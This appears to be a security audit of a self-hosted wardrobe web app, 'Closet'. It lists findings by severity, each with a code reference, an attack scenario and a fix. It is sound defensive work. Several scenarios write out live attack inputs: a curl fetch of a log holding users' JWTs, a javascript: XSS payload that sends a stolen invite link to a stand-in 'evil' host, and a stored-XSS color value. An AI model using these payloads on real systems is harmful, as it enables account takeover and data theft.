# Closet: correctness and security audit (2026-09-25, pass 2)

Scope: /home/aakash/projects/closet, read-only static trace from every controller route to the data source. Nothing was built, run, or sent to production.
Labels: **CONFIRMED** means the code path was traced end to end, with library behaviour checked in node_modules where it mattered. **PLAUSIBLE** means the logic points to a defect I could not fully prove statically.

Note: `docs/audits/2026-09-25/audit-request.md` describes an older revision. The triple JWT verification, the duplicated ownership checks and the loopback-only trustProxy it lists are already fixed: `AuthContextService` runs once per request, `WardrobeShareService.resolveAccess` is the single ownership check, and `TRUSTED_PROXIES` is configurable. Those items are not repeated here.

---

## CRITICAL

### C1. `GET /file/app.log` serves the application log without a session. The log holds every user's JWT. CONFIRMED
- `src/file/controller/file.controller.ts:16` allows any name matching `^[A-Za-z0-9][A-Za-z0-9._-]*$` without `..`, and `:30-36` routes `/file/:fileName` to `LocalFileService.get` (`src/file/local-file/local-file.service.ts:27-35`), which reads `path.join(DATA_PATH, fileName)`.
- `DATA_PATH` also holds `app.log` (`src/app.module.ts:54-65`). Under SQLite, the default driver, it also holds `sqlite3.db`, `-wal` and `-shm` (`app.module.ts:119-121`).
- pino-http's default request serializer logs every request header. The local `data/app.log` has 1634 lines containing `"cookie":"access_token=eyJ..."`.
- `/file/` is a static prefix (`src/static-prefixes.ts:340`). No guard applies, and the Caddy route exposes it on the public hostname.
- **Scenario:** an anonymous user runs `curl https://closet.kashhq.dedyn.io/file/app.log`, collects every household member's `access_token` (365-day JWTs, `auth.module.ts:231`), sets the cookie and gets full account access. Changing the password is the only way to revoke a token, and there is no in-app password change (see H4). On a SQLite deployment, `/file/sqlite3.db` also returns every bcrypt hash and all data.
- **Fix:**
  1. Serve only names that match `STORED_NAME` from `src/file/image-variant.ts:192` (`<uuid>(-nobg|-thumb)?.webp`). Reuse `parseStoredName` in `FileController.sendVariant` instead of the loose regex.
  2. Move photos to their own subdirectory (`DATA_PATH/photos`) so the storage root never shares a directory with the log or the database.
  3. Add `redact: ['req.headers.cookie', 'req.headers.authorization', 'res.headers["set-cookie"]']` to pinoHttp.
  4. After deploying, rotate `ACCESS_TOKEN_SECRET`. That invalidates every token already in the log. Then delete or truncate `app.log` on the NAS.
  5. Add an integration test asserting that `/file/app.log` and `/file/sqlite3.db` return 404.

---

## HIGH

### H1. Rate limiting does nothing, so login and reset-PIN guessing are unlimited. CONFIRMED
- `src/app.module.ts:217` calls `ThrottlerModule.forRoot()` with no arguments. In @nestjs/throttler 6.5.0, the options default to `[]` (`throttler.module.js`: `forRoot(options = [])`). `ThrottlerGuard.canActivate` loops over `this.throttlers`, which is empty, so it never blocks a request.
- `@Throttle({ default: ... })` on `postLogin` (`auth.controller.ts:86`) and `validate/reset-code` (`:164`) only overrides a throttler *named* `default`. None exists, so both decorators do nothing. No test checks for a 429.
- **Scenario:** online password guessing against `/auth/login` on the public hostname runs at whatever rate bcrypt allows. Combined with H3, the 900k reset-PIN space can be exhausted.
- **Fix:** `ThrottlerModule.forRoot([{ name: 'default', ttl: seconds(60), limit: 100 }])`, keep the tighter per-route overrides, add `@Throttle` to `POST /auth/reset-code` and `POST /auth/reset`, and add an integration test asserting a 429 on the sixth login.

### H2. Reflected XSS through `returnTo` on the outfit form. CONFIRMED
- `outfit.controller.ts:52,63` (`newForm`) and `:143,153` (`editForm`) pass `?returnTo=` straight to `views/outfits/form.hbs:6` and `:132` as `href="{{returnTo}}"`. HTML escaping does not block a `javascript:` scheme.
- htmx boost does not intercept the link: `isLocalLink` requires `elt.hostname === location.hostname`, and a `javascript:` URL has an empty hostname. The browser therefore runs it. The CSP allows it because `script-src` includes `'unsafe-inline'` (`src/app.ts:96`).
- **Scenario:** the victim opens `https://closet…/outfits/new?returnTo=javascript:fetch('/wardrobe-share/create-invite-link',{method:'POST',body:new URLSearchParams({permission:'MANAGE'}),headers:{'HX-Request':'true'}}).then(r=>r.text()).then(t=>fetch('https://evil/?'+btoa(t)))` and taps Back or Cancel. The attacker receives a MANAGE invite link to the victim's wardrobe, which is persistent access. The attacker can also change the account email.
- **Fix:** accept only same-origin relative paths: `returnTo?.startsWith('/') && !returnTo.startsWith('//') ? returnTo : '/outfits'`. The POST handler already compares against `'/calendar'`. Longer term, remove `'unsafe-inline'` from `script-src`. That means moving inline `onclick=` handlers to hyperscript or modules and hashing the few inline scripts.

### H3. Password reset PIN never expires, never gets used up, and has no attempt limit. CONFIRMED (latent while email is unconfigured)
- `auth.service.ts:131-144`: `resetPassword` compares `passwordReset?.pin === details.resetCode`. It does not check expiry or delete the reset row after use. A wrong PIN gets the same 302 to `/auth/login` as a correct one (`auth.controller.ts:201-202`), so the user never sees an error, and neither does a brute-forcer.
- `POST /auth/reset-code` has no `@Throttle`, and H1 makes throttling inert anyway.
- The PIN is 6 digits (`auth.service.ts:149`). Every request creates a new `PasswordReset` row and orphans the old one.
- **Scenario:** once `EMAIL_*` is configured, an attacker POSTs `/auth/reset` with the victim's email, then sends `POST /auth/reset-code` for all 900,000 PINs with the same new password, then logs in. Until email is configured the flow fails anyway: the `EMAIL_*` variables are missing from the Joi schema, and `getOrThrow('EMAIL_FROM_ADDRESS')` throws.
- Related bug: for a user who never requested a reset, `user.passwordReset` is null and `.load()` throws a TypeError, which surfaces as a 500 (PLAUSIBLE).
- **Fix:**
  - Store a hash of a long random token, or of the PIN, together with `expiresAt` (15 minutes) and an `attempts` counter.
  - Delete the row on success and after 5 failures.
  - Show an error on a wrong PIN.
  - Throttle the route.
  - Add the `EMAIL_*` variables to Joi, so the reset UI is hidden when email is not configured.

### H4. No CSRF protection: the cookie has no `SameSite` attribute and there is no token. CONFIRMED
- `reply.setCookie('access_token', …, { path, maxAge, httpOnly })` at `auth.controller.ts:59-63` and `:94-98` sets no `sameSite`. Chrome defaults to Lax, with a two-minute exception that still sends the cookie on top-level POSTs right after login. **iOS Safari, the main PWA target, and Firefox do not default to Lax.**
- Nest's Fastify adapter registers the urlencoded parser (`fastify-adapter.js` `registerParserMiddleware`), and multipart is registered too. Both are CORS-simple content types, so cross-site forms and `fetch(…, {mode:'no-cors', credentials:'include'})` both work.
- **Scenario:** a page on another site auto-submits any of these routes:
  - `POST /auth/update-email`: changes the victim's email, with no re-authentication (`auth.service.ts:96-100`).
  - `POST /wardrobe/:id`: can plant the color XSS from H5.
  - `POST /wardrobe/:id/photo` or `/nobg`: replaces photos using a multipart Blob.
  - `POST /wardrobe/:id/archive`, `POST /calendar/:id/delete`, `POST /outfits/:id`, `POST /wardrobe-share/:id/remove`.
  - `GET /auth/logout`.
- `DELETE` routes are safe because they need a preflight.
- **Fix:**
  - Set `sameSite: 'lax'` on both `setCookie` calls and on `clearCookie`. dedyn.io is on the Public Suffix List, so other deSEC hosts count as cross-site. This does not conflict with the no-`Secure` rule.
  - Also reject state-changing requests whose `Origin`/`Sec-Fetch-Site` is cross-site, in the preHandler, or require `HX-Request` on htmx-only routes.
  - Require the current password on `update-email`.

### H5. Stored DOM XSS through custom garment colors. CONFIRMED
- `POST /wardrobe` and `POST /wardrobe/:id` store `body.color` without validation (`wardrobe.controller.ts:190-202,385`). Only the search query is validated against the enum.
- `editForm` splits the stored value into `customColors` (`wardrobe.controller.ts:270-277`). `views/partials/colorMultiSelect.hbs:34-40` renders each one as a checked checkbox. The value is attribute-escaped, but `.value` decodes it again.
- On load, `public/js/color-multiselect.js:31-33` (`renderPills`) concatenates `cb.value` into `innerHTML`. `addCustom` at `:59-62` does the same.
- **Scenario:** a MANAGE grantee, or a CSRF request (H4), sets `color=<img src=x onerror=…>`. The script runs in the owner's session the next time the owner opens that garment's edit page.
- **Fix:** build the pills with `textContent` and `createElement` instead of `innerHTML`. On the server, normalise colors: lowercase, a `[a-z0-9 -]{1,32}` allowlist, and a cap on the count.

---

## MEDIUM

### M1. `ACCESS_TOKEN_SECRET` defaults to `ChangeMe!`, and `AUTH_ENABLED` defaults to false (fail open). CONFIRMED
- `app.module.ts:88,91`.
- The password fingerprint partly protects against token forgery, because a forged token must carry the last 8 characters of the bcrypt hash. But anyone holding one real token has those 8 characters (the JWT payload is only base64-encoded), for example from C1.
- If `AUTH_ENABLED` is misspelled or dropped from the production env, the public hostname serves an open instance where anyone can upload ownerless garments to the NAS.
- **Fix:** when `AUTH_ENABLED=true`, make `ACCESS_TOKEN_SECRET` required with at least 32 characters and `.invalid('ChangeMe!')`. Consider refusing to boot when `SITE_URL` is https and `AUTH_ENABLED=false`, unless an explicit `ALLOW_OPEN_MODE=true` is set.

### M2. Passwords written to stdout. CONFIRMED
- `auth.controller.ts:171` has `console.log(body)` in `postResetCodeValidate`. The body contains `password`, `confirmPassword` and `resetCode`, and htmx calls this route as the user types.
- **Fix:** delete the line.

### M3. Stolen tokens cannot be revoked. CONFIRMED
- JWTs live 365 days (`auth.module.ts:231`). Logout only clears the cookie.
- `AuthService.changePassword` has no route, and password reset needs email, which is unconfigured. So there is no path that changes the password fingerprint, and a leaked token (C1) stays valid for a year.
- Related: `@fastify/cookie` takes `maxAge` in **seconds**. `365*24*60*60*1000` (`auth.controller.ts:61,96`) is about 1000 years. Chrome caps it at 400 days.
- **Fix:** add a change-password page that re-authenticates and sets a new hash, which rotates the fingerprint. Consider a `tokenVersion` column on the user that logout and a "sign out everywhere" action bump. Correct `maxAge` to seconds.

### M4. Editing an outfit silently drops archived garments. CONFIRMED
- `editForm` builds its rows from `garmentService.findAll(userId)` (`outfit.controller.ts:146-149`), which filters `archived: false` (`garment.service.ts:74`).
- `buildCategoryRows` removes slots whose category has no active garments (`outfit.service.ts:406-416`). A slot whose garment is archived renders unselected.
- **Scenario:** an outfit contains a jacket that the user later archives. The user edits the outfit name and saves. The jacket disappears from `slots` and the pivot table.
- **Fix:** load the outfit's own garments, archived included, when building rows, or merge `outfit.garments` into `grouped`, and show them with an "archived" badge.

### M5. The calendar's "today" and default week are UTC, so US evenings land on the wrong day. CONFIRMED
- `calendar.service.ts:325` (`parseWeekParam` defaults to `new Date()`), `:516` (`todayStr = toISOString()`), and `startOfWeek` all use UTC.
- **Scenario:** in US Pacific at 17:00 or later (00:00 UTC), "today" highlights tomorrow. On a Saturday evening, opening the calendar jumps to next week.
- Entry dates are consistent: `YYYY-MM-DD` parses to UTC midnight and is read back with UTC getters.
- Latent: `findWeek` uses local-time `setDate` (`:175-176,186-189`). That becomes an off-by-one across DST if the container ever gets a `TZ` value. Today the container runs in UTC because the Dockerfile sets no `TZ`.
- **Fix:** let the client send its local date (always pass `?week=` from the client, or send a `tz` cookie or header) and compute "today" in that zone. Replace `setDate` with `setUTCDate` in `findWeek`.

### M6. Creating an outfit and scheduling it are not atomic. Scheduling from the outfit form creates duplicates. CONFIRMED
- `outfit.controller.ts:89-98` and `:186-196` flush the outfit, then call `calendarService.create` separately.
- An invalid or missing-time `scheduleDate` (`new Date('garbage')`) fails after the outfit is saved and returns a 500. The user resubmits and gets a duplicate outfit.
- The edit form creates a new calendar entry on every save that has a date.
- On SQLite, `calendar.service.ts:226` calls `dto.date.toISOString()` after the flush and throws a RangeError, leaving an entry with an invalid date.
- **Fix:** validate the date with a DTO (`@IsISO8601({strict:true})`), write outfit and entry in one `em.transactional`, and deduplicate the entry on (outfit, date).

### M7. Decompression and memory bombs in image upload. PLAUSIBLE
- No `limitInputPixels` is set anywhere. sharp's default is about 268 megapixels (`file-service.abstract.ts:303-310,318-327,408`).
- heic-convert decodes the whole image into an RGBA buffer in JavaScript and encodes JPEG synchronously with jpeg-js. The byte cap is 40 MB, but nothing caps the dimensions (`src/file/heic.ts:266-282`).
- Multipart allows 100 MB per file (`app.ts:104-109`).
- **Scenario:** an authenticated user uploads a tiny HEIC declaring a 20000×20000 grid. The decode allocates about 1.6 GB and the event loop blocks for seconds, possibly crashing the container out of memory on the NAS.
- **Fix:**
  - Use `sharp({ limitInputPixels: 50_000_000 })`.
  - Read the HEIC `ispe` dimensions first, for example with `heic-decode`'s `.all()` metadata, and reject anything above about 50 megapixels.
  - Lower `fileSize` to about 25 MB.
  - Set `sharp.concurrency(1)` on the NAS.

### M8. The service worker keeps the previous user's pages after logout. CONFIRMED (low impact in a household)
- `views/assets/src-sw.ts:45-46` (`pages-v1`, NetworkFirst) and `:90-91` (`images-v1`, CacheFirst). `GET /auth/logout` (`auth.controller.ts:110-117`) clears no cache.
- **Scenario:** user A logs out and user B logs in on the same phone. When offline, or when the network takes longer than 3 seconds, B is served A's wardrobe and calendar pages.
- **Fix:** send `Clear-Site-Data: "cache"` on logout, and/or post a message to the service worker to delete `pages-v1` and `images-v1`. Also consider including the user id in the cache key.

---

## LOW

- **L1. User enumeration by timing at login.** `signIn` calls `findOneOrFail` and throws before bcrypt runs for an unknown email (`auth.service.ts:72-77`). Compare against a dummy hash instead. Emails are also case-sensitive at registration and login, so `Alice@` and `alice@` are two different accounts.
- **L2. Share permission is not validated.** `createInviteLink` stores any string as `permission` (`wardrobe-share.controller.ts:71-78`). Validate it against the `SharePermission` enum.
- **L3. View-only grantees can clone.** `cloneCreate` needs only view access (`wardrobe.controller.ts:321-354`), while `show` sets `canClone = canManage`. The two disagree; pick one. The clone writes only to the requester's own wardrobe, so it is not a write to the grantor's data.
- **L4. `/share` exposes owner emails.** `/share?type=garment|outfit|file` shows the owner's email to anyone holding the link (`open-graph.service.ts:64,86,111`, `views/share.hbs:69`). Share links cannot be revoked: `shareableId` is permanent.
- **L5. Bad input returns 500 instead of 4xx.** Examples:
  - `?ownerId=abc` → NaN reaches Postgres (`wardrobe.controller.ts:53-55`). Use `ParseIntPipe({optional:true})`.
  - `/file/watermark/<unknown>` → `findOneOrFail` NotFoundError → 500 (`file-service.abstract.ts:247-250`).
  - A duplicate email on `update-email` → unique-constraint violation → 500.
  - A missing `category` on garment create → NOT NULL violation → 500.
  - An invalid `dateAquired` → 500. On SQLite the stored `NaN` then crashes `formatDate` on every render.
  - Fix: add class-validator DTOs to the garment and outfit bodies, which are currently untyped `@Body()` objects.
- **L6. `RegistrationGuard` sends a response and then returns false.** Nest then throws a ForbiddenException on a reply that was already sent, which logs a warning twice (`registration.guard.ts:8-14`). Throw `RedirectToLoginException('/auth/login')` instead, as the other guards do.
- **L7. Push subscription collisions.** `pushEndpoint` is unique, so a device that re-subscribes under a second account gets a 500. The first account's row keeps receiving pushes on that phone (`notification.service.ts:101-129`). Upsert by endpoint instead. The endpoint URL is also user-supplied, which allows a blind HTTPS SSRF from the NAS via `POST /notification/test`. It is authenticated only.
- **L8. Forwarded headers are trusted unconditionally.** `X-Forwarded-Host/Proto` are read without checking `trustProxy` (`view-context.service.ts:35-38`), which lets a caller change `canonicalUrl` and `og:url`. Use `req.hostname` and `req.protocol`, which already honour `trustProxy`.
- **L9. Color filter matches custom colors by substring.** It uses `$like '%red%'` (`garment.service.ts:72`), so it matches custom colors such as "dark red". The comment's reasoning only holds for enum values.
- **L10. Photo route reports success when nothing was saved.** `POST /wardrobe/:id/photo` with no `photo` part still returns `HX-Redirect …photoSaved=1` (`wardrobe.controller.ts:410-419`).
- **L11. Container runs as root.** No `USER` directive in `docker/Dockerfile`.
- **L12. Wrong status codes in auth.** `AuthGuard` returns a 401 page on the navigation routes `/auth/profile`, `/auth/delete-account` and `/auth/update-email`. They should redirect to login, like `RequireSessionGuard`. Failed login and validation renders return 201 (a known item).
- **L13. Concurrent photo replacement.** Two uploads for the same garment at once leave one orphaned `File` row plus its bytes until the nightly reconciliation. This is acceptable, but a row lock (`findOne` with `lockMode: PESSIMISTIC_WRITE` on Postgres) would remove it.

---

## Answers to the brief's questions
- **Cross-user access by changing an ID:** not possible for garments, outfits, calendar entries or shares. Every write goes through `GarmentService.findOne`, `OutfitService.findOne` or `CalendarService.findOneOwned` with an owner or share check, and garment IDs in outfits are filtered by owner.
- **Cross-user access by file name:** file names are unguessable UUIDs, but `/file/*` does not check ownership (a deliberate design choice) and does serve non-photo files (C1).
- **Share tokens:** single use, and cannot be self-accepted.
- **Can a view-only share write?** No write to the grantor's data. Clone is the only inconsistency (L3).
- **With `AUTH_ENABLED=false` on the public hostname:** anonymous users get full read, write and upload access to ownerless data, and `/auth/*` still accepts registrations. With `AUTH_ENABLED=true`, the only unguarded routes are `/file/*`, `/share`, `/wardrobe-share/invite/:token`, `/about`, `/offline.html`, `/manifest.json`, `/healthz`, `/notification/vapid-public-key` and `/auth/*`.
- **GETs that change state:** only `/auth/logout`. `/file/thumb/*` lazily writes a missing thumbnail, which is harmless.
- **Error pages:** no stack traces leak. Non-HTTP errors render "Internal server error".
- **Triple-stash output:** every use is config- or enum-derived: `about.hbs`, JSON-LD `ogTitle`, `knownColors`. It becomes risky only if `APP_NAME` ever contains `</script>`.
